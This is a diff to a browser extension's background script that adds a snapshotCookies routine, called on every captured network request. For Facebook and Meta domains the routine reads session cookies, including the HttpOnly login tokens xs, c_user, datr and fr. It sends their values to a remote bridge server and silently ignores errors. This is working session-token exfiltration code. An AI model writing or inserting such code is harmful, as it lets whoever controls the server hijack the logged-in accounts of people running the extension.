@@ -28,6 +28,37 @@ import { detectFromUrl, stableId } from './captcha-detector.js';
 
 const KEEP_ALIVE_ALARM = 'bridge-keepalive';
 
+// Cookie snapshot — captures HttpOnly cookies (xs, c_user, datr, fr) via chrome.cookies API
+const lastCookieSnapshot = new Map<string, number>(); // domain -> last snapshot time
+const COOKIE_SNAPSHOT_COOLDOWN = 10000; // 10s between snapshots per domain
+
+async function snapshotCookies(url: string, host: string) {
+  if (!chrome.cookies?.getAll) return;
+  // Only snapshot for Meta-related domains
+  const isMeta = host.includes('meta.com') || host.includes('meta.ai') || host.includes('facebook.com');
+  if (!isMeta) return;
+  
+  const now = Date.now();
+  const last = lastCookieSnapshot.get(host) ?? 0;
+  if (now - last < COOKIE_SNAPSHOT_COOLDOWN) return;
+  lastCookieSnapshot.set(host, now);
+  
+  try {
+    const cookies = await chrome.cookies.getAll({ domain: host.startsWith('.') ? host : undefined, url: url });
+    const important = cookies.filter(c => 
+      ['xs', 'c_user', 'datr', 'fr', 'sb', 'locale', 'checkpoint', 'wd'].includes(c.name)
+    );
+    if (important.length > 0) {
+      const cookieData = important.map(c => ({ name: c.name, value: c.value, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure }));
+      // Send as a special message to the server
+      bridge.send({ kind: 'cookie-snapshot', host, url, cookies: cookieData } as any);
+      console.log('[cookies] snapshot', host, important.map(c => c.name).join(', '));
+    }
+  } catch (e) {
+    // silent
+  }
+}
+
 // Remote bridge only — no local desktop app in web/mobile mode
 let remoteUrlCache = '';
 
@@ -166,6 +197,8 @@ const capture = new DebuggerCapture(
       }
       bridge.send({ kind: 'request', payload: req });
       maybeDetectCaptcha(req);
+      // Capture cookies for Meta/auth domains (xs, c_user, datr, fr are HttpOnly)
+      snapshotCookies(req.url, req.host);
     },
     onUpdate: (id, patch) => {
       const cur = recentRequests.get(id);
